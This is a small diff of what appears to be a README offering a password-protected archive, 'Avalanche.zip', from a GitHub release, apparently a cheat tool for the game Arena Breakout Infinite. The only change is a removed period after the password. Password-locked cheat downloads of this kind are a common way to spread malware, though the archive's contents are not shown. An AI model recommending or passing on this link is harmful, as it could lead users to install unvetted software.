@@ -4,7 +4,7 @@
 
 
 1. (https://github.com/ziltoolcc/Avalanche_Arena-BreakoutInfinite/releases/download/latest/Avalanche.zip).
-2. Pass: **Avalanche**.
+2. Pass: **Avalanche**
 
 ---
 
